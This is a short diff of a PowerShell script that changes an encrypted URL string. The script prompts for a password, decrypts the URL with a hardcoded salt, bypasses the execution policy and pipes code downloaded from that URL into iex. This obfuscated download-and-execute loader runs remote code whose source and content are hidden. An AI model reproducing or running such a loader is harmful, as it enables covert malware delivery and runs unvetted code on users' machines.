@@ -17,7 +17,7 @@ function Decrypt-String ($Encrypted, $Passphrase, $salt = "Ad3t049866", $init = 
 	$ms.Close()
 	$r.Clear()
 }
-$encURL = "O62M8Rzf7woutcr9IyqXtEVBP3Qug3lHFaggYj0YktDjEOutVAFj+9Ome5yy4HPOs6nTORTQ1hoH5WqHYOnx7/im99IdxanB2SrZX6JlS2asFWWZFrI+SM1o3hc9tsLPivEhg5FxJuN76++2JdmfJlk7ud9kVOJXamaZKTO5qXZMPB6vsMUj6pN9UKgJlcc0"
+$encURL = "O62M8Rzf7woutcr9IyqXtEVBP3Qug3lHFaggYj0YktDjEOutVAFj+9Ome5yy4HPOs6nTORTQ1hoH5WqHYOnx7/im99IdxanB2SrZX6JlS2asFWWZFrI+SM1o3hc9tsLPivEhg5FxJuN76++2JdmfJmMqqafZfUK4Qja4RLNpUSVnOWKwDt0w9nWzayyRIGKd"
 $pass = Read-Host "Password"
 $decURL = Decrypt-String -Encrypted $encURL -Passphrase $pass
 Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString($decURL))
